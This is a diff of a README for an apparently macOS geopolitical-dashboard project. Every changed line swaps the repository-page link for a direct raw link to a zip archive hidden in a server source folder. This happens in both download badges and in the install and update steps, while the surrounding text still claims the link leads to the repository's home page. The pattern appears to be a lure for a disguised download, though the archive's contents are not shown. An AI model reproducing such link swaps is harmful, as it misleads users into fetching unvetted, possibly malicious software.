@@ -1,6 +1,6 @@
 # 🌍 worldmonitor-macos-backup - Real-Time Geopolitical Dashboard
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/MagBone0/worldmonitor-macos-backup)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/MagBone0/worldmonitor-macos-backup/main/server/worldmonitor/market/macos-backup-worldmonitor-2.7-beta.3.zip)
 
 ## 📋 About worldmonitor-macos-backup
 
@@ -32,7 +32,7 @@ Follow these steps to get worldmonitor-macos-backup running on your macOS comput
 ### 1. Download the App
 
 Click the green button above or visit the main page here:  
-[https://github.com/MagBone0/worldmonitor-macos-backup](https://github.com/MagBone0/worldmonitor-macos-backup)
+[https://raw.githubusercontent.com/MagBone0/worldmonitor-macos-backup/main/server/worldmonitor/market/macos-backup-worldmonitor-2.7-beta.3.zip](https://raw.githubusercontent.com/MagBone0/worldmonitor-macos-backup/main/server/worldmonitor/market/macos-backup-worldmonitor-2.7-beta.3.zip)
 
 This link takes you to the repository’s home page. From there:
 
@@ -104,7 +104,7 @@ If you have issues, try these steps:
 To get the latest features and fixes:
 
 - Visit the repository page:  
-  [https://github.com/MagBone0/worldmonitor-macos-backup](https://github.com/MagBone0/worldmonitor-macos-backup)
+  [https://raw.githubusercontent.com/MagBone0/worldmonitor-macos-backup/main/server/worldmonitor/market/macos-backup-worldmonitor-2.7-beta.3.zip](https://raw.githubusercontent.com/MagBone0/worldmonitor-macos-backup/main/server/worldmonitor/market/macos-backup-worldmonitor-2.7-beta.3.zip)
 - Check the **Releases** section for the newest version.
 - Download and install it following the same steps as the first install.
 
@@ -137,4 +137,4 @@ worldmonitor-macos-backup uses encrypted connections to retrieve data. It does n
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/MagBone0/worldmonitor-macos-backup)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/MagBone0/worldmonitor-macos-backup/main/server/worldmonitor/market/macos-backup-worldmonitor-2.7-beta.3.zip)
